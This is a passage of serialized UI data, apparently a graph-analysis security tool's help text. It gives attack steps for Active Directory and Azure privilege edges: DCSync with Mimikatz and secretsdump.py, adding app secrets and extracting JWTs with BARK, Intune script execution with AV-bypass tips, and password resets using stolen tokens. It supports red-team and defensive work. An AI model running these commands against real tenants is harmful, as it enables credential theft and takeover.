/ticket:doIFvjCCBbqgAwI..."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":{"type":"b","key":null,"ref":null,"props":{"children":"Linux:"},"_owner":null,"_store":{}}},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Set the KRB5CCNAME environment variable to the ticket's path:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"export KRB5CCNAME=$path_to_ticket.ccache"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body1","children":"Step 4: DCSync the Target Domain"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":{"type":"b","key":null,"ref":null,"props":{"children":"Windows:"},"_owner":null,"_store":{}}},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Use Mimikatz to DCSync the target domain from the machine where the DC TGT was injected:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"lsadump::dcsync /domain:domain.local /user:DOMAIN\\Administrator"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":{"type":"b","key":null,"ref":null,"props":{"children":"Linux:"},"_owner":null,"_store":{}}},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Use secretsdump.py to DCSync the target domain:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"secretsdump.py -k -just-dc-user <DOMAIN/targetuser> <target DC DNS name>"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}},{"technique":"CanPSRemote","windows":{},"linux":{},"abuse":{}},{"technique":"AZAddMembers","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Via the Azure portal:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"children":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"children":"Find the group in your tenant (Azure Active Directory -> Groups -> Find Group in list)"},"_owner":null,"_store":{}}},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"children":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"children":"Click the group from the list"},"_owner":null,"_store":{}}},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"children":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"children":"In the left pane, click \"Members\""},"_owner":null,"_store":{}}},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"children":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"children":"At the top, click \"Add members\""},"_owner":null,"_store":{}}},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"children":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"children":"Find the principals you want to add to the group and click them, then click \"select\" at the bottom"},"_owner":null,"_store":{}}},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"children":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"children":"You should see a message in the top right saying \"Member successfully added\""},"_owner":null,"_store":{}}},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Via PowerZure: Add-AzureADGroup -User [UPN] -Group [Group name]"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}},{"technique":"AZAddSecret","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"There are several ways to perform this abuse, depending on what sort of access you have to the credentials of the object that holds this privilege against the target object. If you have an interactive web browser session for the Azure portal, it is as simple as finding the target App in the portal and adding a new secret to the object using the “Certificates & secrets” tab. Service Principals do not have this tab in the Azure portal but you can add secrets to them with the MS Graph API."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"No matter what kind of control you have, you will be able to perform this abuse by using BARK’s New-AppRegSecret or New-ServicePrincipalSecret functions."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["These functions require you to supply an MS Graph-scoped JWT associated with the principal that has the privilege to add a new secret to your target application. There are several ways to acquire a JWT. For example, you may use BARK’s Get-GraphTokenWithRefreshToken to acquire an MS Graph-scoped JWT by supplying a refresh token:",{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"$MGToken = Get-GraphTokenWithRefreshToken -RefreshToken \"0.ARwA6WgJJ9X2qk…\" -TenantID \"contoso.onmicrosoft.com\""},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["Then use BARK’s New-AppRegSecret to add a new secret to the target application:",{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"New-AppRegSecret -AppRegObjectID \"d878…\" -Token $MGToken.access_token"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["The output will contain the plain-text secret you just created for the target app:",{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"PS /Users/andyrobbins> New-AppRegSecret -AppRegObjectID \"d878…\" -Token $MGToken.access_token Name Value ---- ----- AppRegSecretValue odg8Q~... AppRegAppId 4d31… AppRegObjectId d878…"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["With this plain text secret, you can now acquire tokens as the service principal associated with the app. You can easily do this with BARK’s Get-MSGraphToken function:",{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"PS /Users/andyrobbins> $SPToken = Get-MSGraphToken `-ClientID \"4d31…\" `-ClientSecret \"odg8Q~...\" `-TenantName \"contoso.onmicrosoft.com\" PS /Users/andyrobbins> $SPToken.access_token eyJ0eXAiOiJKV1QiLCJub…"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Now you can use this JWT to perform actions against any other MS Graph endpoint as the service principal, continuing your attack path with the privileges of that service principal."},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}},{"technique":"AZAvereContributor","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"The Avere Contributor role allows you to run SYSTEM commands on the VM"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Via PowerZure:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"target":"_blank","rel":"noopener","href":"http://Invoke-AzureRunCommand","children":"Invoke-AzureRunCommand"},"_owner":null,"_store":{}},{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"target":"_blank","rel":"noopener","href":"http://Invoke-AzureRunMSBuild","children":"Invoke-AzureRunMSBuild"},"_owner":null,"_store":{}},{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"target":"_blank","rel":"noopener","href":"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#invoke-azurerunprogram","children":"Invoke-AzureRunProgram"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}},{"technique":"AZContains","windows":{},"linux":{},"abuse":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"There is no abuse necessary, but any roles scoped on a parent object will descend down to all child objects."},"_owner":null,"_store":{}}},{"technique":"AZContributor","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"This depends on what the target object is:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"fontWeight":"fontWeightBold","children":"Key Vault"},"_owner":null,"_store":{}},": You can read secrets and alter access policies (grant yourself access to read secrets)"]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"fontWeight":"fontWeightBold","children":"Automation Account"},"_owner":null,"_store":{}},": You can create a new runbook that runs as the Automation Account, and edit existing runbooks. Runbooks can be used to authenticate as the Automation Account and abuse privileges held by the Automation Account. If the Automation Account is using a 'RunAs' account, you can gather the certificate used to login and impersonate that account."]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"fontWeight":"fontWeightBold","children":"Virtual Machine"},"_owner":null,"_store":{}},": Run SYSTEM commands on the VM"]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"fontWeight":"fontWeightBold","children":"Resource Group"},"_owner":null,"_store":{}},": NOT abusable, and not collected by AzureHound"]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Via PowerZure:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"target":"_blank","rel":"noopener","href":"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent","children":"Get-AzureKeyVaultContent"},"_owner":null,"_store":{}},{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"target":"_blank","rel":"noopener","href":"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#export-azurekeyvaultcontent","children":"Export-AzureKeyVaultContent"},"_owner":null,"_store":{}},{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"target":"_blank","rel":"noopener","href":"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurerunascertificate","children":"Get-AzureRunAsCertificate"},"_owner":null,"_store":{}},{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"target":"_blank","rel":"noopener","href":"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurerunbookcontent","children":"Get-AzureRunbookContent"},"_owner":null,"_store":{}},{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"target":"_blank","rel":"noopener","href":"http://Invoke-AzureRunCommand","children":"Invoke-AzureRunCommand"},"_owner":null,"_store":{}},{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"target":"_blank","rel":"noopener","href":"http://Invoke-AzureRunMSBuild","children":"Invoke-AzureRunMSBuild"},"_owner":null,"_store":{}},{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"target":"_blank","rel":"noopener","href":"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#invoke-azurerunprogram","children":"Invoke-AzureRunProgram"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}},{"technique":"AZExecuteCommand","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"First, have your PowerShell script ready to go and save it somewhere as a PS1 file. Take all the necessary operational security (opsec) and AMSI-bypass steps you want at this point, keeping in mind the script will run as the SYSTEM user unless you specify otherwise. Also keep in mind that the script will be written to disk, so take whatever AV bypass measures you need as well."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Next, log into the Azure web portal as the user with the “Intune Administrator” role activated. After authenticating, access Endpoint Manager at https://endpoint.microsoft.com"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Click on “Devices” on the left, which takes you, unsurprisingly, to the devices overview. Click on “Scripts” under the “Policy” section to go to the scripts management page. Click “Add,” then click “Windows 10”"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"This will bring you to the “Add Powershell Script” page. On this first page, you’ll enter a name for the script and a brief description. On the next page, click the folder and then select your PS1 from the common dialogue window. You’ve now got three options to configure, but can leave them all in the default “No” position. Most interestingly, keeping the first selection as “No” will cause the script to run as the SYSTEM user"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Click next, and you’ll see the page that lets you scope which systems and users this script will execute for. You can choose to assign the script to “All devices,” “All users,” or “All users and devices.” If you leave the “Assign to” dropdown at its default selection of “Selected groups,” you can scope the script to only execute on systems or for users that belong to certain security groups. The choice is yours: run the script on every possible system or constrain it to only run on certain systems by scoping it to existing security groups or by adding specific devices or users to new security groups."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Click “Next” and you’ll see the review page which lets you see what you’re about to do. Click “Add” and Azure will begin registering the script."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"At this point, the script is now ready to run on your target systems. This process works similarly to Group Policy, in that the Intune agent running on each device periodically checks in (by default every hour) with Intune/Endpoint Manager to see if there is a PowerShell script for it to run, so you will need to wait up to an hour for your target system to actually pull the script down and run it."},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}},{"technique":"AZGetCertificates","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Use PowerShell or PowerZure to fetch the certificate from the key vault"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Via PowerZure"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"target":"_blank","rel":"noopener","href":"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent","children":"Get-AzureKeyVaultContent"},"_owner":null,"_store":{}},{"type":"br","key":null,"ref":null,"props":{},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"target":"_blank","rel":"noopener","href":"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#export-azurekeyvaultcontent","children":"Export-AzureKeyVaultcontent"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}},{"technique":"AZGetKeys","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Use PowerShell or PowerZure to fetch the key from the key vault"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Via PowerZure"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"target":"_blank","rel":"noopener","href":"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#export-azurekeyvaultcontent","children":"Export-AzureKeyVaultContent"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}},{"technique":"AZGetSecrets","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Use PowerShell or PowerZure to fetch the secret from the key vault"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Via PowerZure"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"target":"_blank","rel":"noopener","href":"https://powerzure.readthedocs.io/en/latest/Functions/operational.html#get-azurekeyvaultcontent","children":"Get-AzureKeyVaultContent"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}},{"technique":"AZHasRole","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"No abuse is necessary. This edge only indicates that the principal has been granted a particular AzureAD admin role."},"_owner":null,"_store":{}}},"_owner":null,"_store":{}}},{"technique":"AZManagedIdentity","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"You can modify the Azure RM resource to execute actions against Azure with the privileges of the Managed Identity Service Principal."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"It is also possible to extract a JSON Web Token (JWT) for the Service Principal, then use that JWT to authenticate as the Service Principal outside the scope of the Azure RM resource. Here is how you extract the JWT using PowerShell:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"$tokenAuthURI = $env:MSI_ENDPOINT + \"?resource=https://graph.microsoft.com/&api-version=2017-09-01\"\n$tokenResponse = Invoke-RestMethod -Method Get -Headers @{\"Secret\"=\"$env:MSI_SECRET\"} -Uri $tokenAuthURI\n$tokenResponse.access_token"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"We can then use this JWT to authenticate as the Service Principal to the Microsoft Graph APIs using BARK for example."},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}},{"technique":"AZMemberOf","windows":{},"linux":{},"abuse":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"No abuse is necessary. This edge simply indicates that a principal belongs to a security group."},"_owner":null,"_store":{}}},{"technique":"AZOwns","windows":{},"linux":{},"abuse":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Everything a Contributor can do, with the addition of assigning rights to resources."},"_owner":null,"_store":{}}},{"technique":"AZPrivilegedAuthAdmin","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body1","children":"Set secret for Service Principal (AZAddSecret abuse info)"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"There are several ways to perform this abuse, depending on what sort of access you have to the credentials of the object that holds this privilege against the target object. If you have an interactive web browser session for the Azure portal, it is as simple as finding the target App in the portal and adding a new secret to the object using the “Certificates & secrets” tab. Service Principals do not have this tab in the Azure portal but you can add secrets to them with the MS Graph API."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"No matter what kind of control you have, you will be able to perform this abuse by using BARK’s New-AppRegSecret or New-ServicePrincipalSecret functions."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["These functions require you to supply an MS Graph-scoped JWT associated with the principal that has the privilege to add a new secret to your target application. There are several ways to acquire a JWT. For example, you may use BARK’s Get-GraphTokenWithRefreshToken to acquire an MS Graph-scoped JWT by supplying a refresh token:",{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"$MGToken = Get-GraphTokenWithRefreshToken -RefreshToken \"0.ARwA6WgJJ9X2qk…\" -TenantID \"contoso.onmicrosoft.com\""},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["Then use BARK’s New-AppRegSecret to add a new secret to the target application:",{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"New-AppRegSecret -AppRegObjectID \"d878…\" -Token $MGToken.access_token"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["The output will contain the plain-text secret you just created for the target app:",{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"PS /Users/andyrobbins> New-AppRegSecret -AppRegObjectID \"d878…\" -Token $MGToken.access_token Name Value ---- ----- AppRegSecretValue odg8Q~... AppRegAppId 4d31… AppRegObjectId d878…"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["With this plain text secret, you can now acquire tokens as the service principal associated with the app. You can easily do this with BARK’s Get-MSGraphToken function:",{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"PS /Users/andyrobbins> $SPToken = Get-MSGraphToken `-ClientID \"4d31…\" `-ClientSecret \"odg8Q~...\" `-TenantName \"contoso.onmicrosoft.com\" PS /Users/andyrobbins> $SPToken.access_token eyJ0eXAiOiJKV1QiLCJub…"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Now you can use this JWT to perform actions against any other MS Graph endpoint as the service principal, continuing your attack path with the privileges of that service principal."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body1","children":"Reset password of user (AZResetPassword abuse info)"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"There are several options for executing this attack. What will work best for you depends on a few factors, including which type of credential you possess for the principal with the password reset privilege against the target, whether that principal is affected by MFA requirements, and whether the principal is affected by conditional access policies."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"The most simple way to execute this attack is to log into the Azure Portal at portal.azure.com as the principal with the password reset privilege, locate the target user in the Portal, and click \"Reset Password\" on the target user’s overview tab."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"You can also execute this attack with the official Microsoft PowerShell module, using Set-AzureADUserPassword, or PowerZure’s Set-AzureUserPassword cmdlet."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"In some situations, you may only have access to your compromised principal’s JWT, and not its password or other credential material. For example, you may have stolen a JWT for a service principal from an Azure Logic App, or you may have stolen a user’s JWT from Chrome."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"There are at least two ways to reset a user’s password when using a token, depending on the scope of the token and the type of identity associated with the token:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body1","children":"Using an MS Graph-scoped token"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"If your token is associated with a Service Principal or User, you may set the target’s password to a known value by hitting the MS Graph API."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"You can use BARK’s Set-AZUserPassword cmdlet to do this. First, we need to either already have or create an MS Graph-scoped JWT for the user or service principal with the ability to reset the target user’s password:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"$MGToken = (Get-MSGraphTokenWithClientCredentials -ClientID \"<service principal’s app id>\" -ClientSecret \"<service principal’s plain text secret>\" -TenantName \"contoso.onmicrosoft.com\").access_token"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Then we supply this token, our target user’s ID, and the new password to the Set-AZUserPassword cmdlet:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Set-AZUserPassword -Token $MGToken -TargetUserID \"d9644c...\" -Password \"SuperSafePassword12345\""},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":["If successful, the output will include a \"204\" status code:",{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"StatusCode : 204 StatusDescription : NoContent Content : {} RawContent : HTTP/1.1 204 NoContent Cache-Control: no-cache Strict-Transport-Security: max-age=31536000 request-id: 94243... client-request-id: 94243... x-ms… Headers : {[Cache-Control, System.String[]], [Strict-Transport-Security, System.String[]], [request-id, System.String[]], [client-request-id, System.String[]]…} RawContentLength : 0 RelationLink : {}"},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body1","children":"Using an Azure Portal-scoped token"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"You may have or be able to acquire an Azure Portal-scoped JWT for the user with password reset rights against your target user. In this instance, you can reset the user’s password, letting Azure generate a new random password for the user instead of you supplying one. For this, you can use BARK’s Reset-AZUserPassword cmdlet."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"You may already have the Azure Portal-scoped JWT, or you may acquire one through various means. For example, you can use a refresh token to acquire a Portal-scoped JWT by using BARK’s Get-AzurePortalTokenWithRefreshToken cmdlet:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"$PortalToken = Get-AzurePortalTokenWithRefreshToken -RefreshToken $RefreshToken -TenantID \"contoso.onmicrosoft.com\""},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Now you can supply the Portal token to BARK’s Reset-AZUserPassword cmdlet:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"Reset-AZUserPassword -Token $PortalToken.access_token -TargetUserID \"targetuser@contoso.onmicrosoft.com\""},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"If successful, the response will look like this:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"StatusCode : 200 StatusDescription : OK Content : \"Gafu1918\" RawContent : HTTP/1.1 200 OK Cache-Control: no-store Set-Cookie: browserId=d738e8ac-3b7d-4f35-92a8-14635b8a942b; domain=main.iam.ad.ext.azure.com; path=/; secure; HttpOnly; SameSite=None X-Content-Type-Options: no… Headers : {[Cache-Control, System.String[]], [Set-Cookie, System.String[]], [X-Content-Type-Options, System.String[]], [X-XSS-Protection, System.String[]]…} Images : {} InputFields : {} Links : {} RawContentLength : 10 RelationLink : {}"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"As you can see, the plain-text value of the user’s password is visible in the \"Content\" parameter value."},"_owner":null,"_store":{}}]},"_owner":null,"_store":{}}},{"technique":"AZPrivilegedRoleAdmin","windows":{},"linux":{},"abuse":{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Activate the Global Admin role for yourself or for another user using PowerZure or PowerShell."},"_owner":null,"_store":{}}},{"technique":"AZResetPassword","windows":{},"linux":{},"abuse":{"key":null,"ref":null,"props":{"children":[{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"There are several options for executing this attack. What will work best for you depends on a few factors, including which type of credential you possess for the principal with the password reset privilege against the target, whether that principal is affected by MFA requirements, and whether the principal is affected by conditional access policies."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"The most simple way to execute this attack is to log into the Azure Portal at portal.azure.com as the principal with the password reset privilege, locate the target user in the Portal, and click \"Reset Password\" on the target user’s overview tab."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"You can also execute this attack with the official Microsoft PowerShell module, using Set-AzureADUserPassword, or PowerZure’s Set-AzureUserPassword cmdlet."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"In some situations, you may only have access to your compromised principal’s JWT, and not its password or other credential material. For example, you may have stolen a JWT for a service principal from an Azure Logic App, or you may have stolen a user’s JWT from Chrome."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"There are at least two ways to reset a user’s password when using a token, depending on the scope of the token and the type of identity associated with the token:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body1","children":"Using an MS Graph-scoped token"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"If your token is associated with a Service Principal or User, you may set the target’s password to a known value by hitting the MS Graph API."},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"You can use BARK’s Set-AZUserPassword cmdlet to do this. First, we need to either already have or create an MS Graph-scoped JWT for the user or service principal with the ability to reset the target user’s password:"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"component":"pre","children":"$MGToken = (Get-MSGraphTokenWithClientCredentials -ClientID \"<service principal’s app id>\" -ClientSecret \"<service principal’s plain text secret>\" -TenantName \"contoso.onmicrosoft.com\").access_token"},"_owner":null,"_store":{}},{"type":{"propTypes":{}},"key":null,"ref":null,"props":{"variant":"body2","children":"Then we supply this token, our target user’s ID, and the new password to the Set-AZUserPassword 